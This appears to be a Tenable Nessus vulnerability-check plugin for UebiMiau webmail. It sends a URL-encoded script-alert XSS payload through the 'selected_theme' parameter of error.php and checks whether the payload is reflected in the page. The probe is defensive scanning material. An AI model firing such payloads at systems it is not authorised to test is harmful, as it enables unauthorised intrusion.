#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(25345);
  script_version("$Revision: 1.18 $");

  script_cve_id("CVE-2007-3170", "CVE-2007-3171", "CVE-2007-3172");
  script_bugtraq_id(24210);
  script_osvdb_id(37463, 37464, 38337, 53372);

  script_name(english:"UebiMiau Multiple Input Validation Vulnerabilities");
  script_summary(english:"Checks for an XSS flaw in UebiMiau");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that is susceptible to
multiple attacks." );
 script_set_attribute(attribute:"description", value:
"The remote host is running UebiMiau, a webmail application written in
PHP. 

The version of UebiMiau installed on the remote host fails to sanitize
user input to the 'selected_theme' parameter of the 'error.php' script
before using it as a template to generate dynamic HTML.  An
unauthenticated attacker may be able to leverage this issue to
disclose information about files or directories or to launch a cross-
site script attack against the affected application." );
 script_set_attribute(attribute:"see_also", value:"http://seclists.org/fulldisclosure/2007/May/511");
 script_set_attribute(attribute:"solution", value:
"Unknown at this time." );
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:ND/RL:U/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
 script_cwe_id(20, 74, 79, 442, 629, 711, 712, 722, 725, 750, 751, 800, 801, 809, 811, 864, 900, 928, 931, 990);

 script_set_attribute(attribute:"plugin_publication_date", value: "2007/05/30");
 script_set_attribute(attribute:"vuln_publication_date", value: "2007/05/28");
 script_cvs_date("$Date: 2016/11/03 14:16:36 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2007-2016 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl", "cross_site_scripting.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/PHP");
  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");


port = get_http_port(default:80, embedded: 0);
if (!can_host_php(port:port)) exit(0);
if (get_kb_item("www/"+port+"/generic_xss")) exit(0);


# A simple alert.
xss = raw_string("<script>alert(", SCRIPT_NAME, ")</script>");
exss = urlencode(str:xss);


# Loop through various directories.
if (thorough_tests) dirs = list_uniq(make_list("/webmail", "/uebimiau", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs)
{
  # Try to exploit the issue.
  r = http_send_recv3(method:"GET", port: port,
    item:string( dir, "/error.php?",  "selected_theme=", exss) );
  if (isnull(r)) exit(0);
  res = r[2];

  # There's a problem if we see our exploit.
  if (string('unable to read template resource: "', xss, "/error.htm") >< res)
  {
    security_warning(port);
    set_kb_item(name: 'www/'+port+'/XSS', value: TRUE);
    exit(0);
  }
}
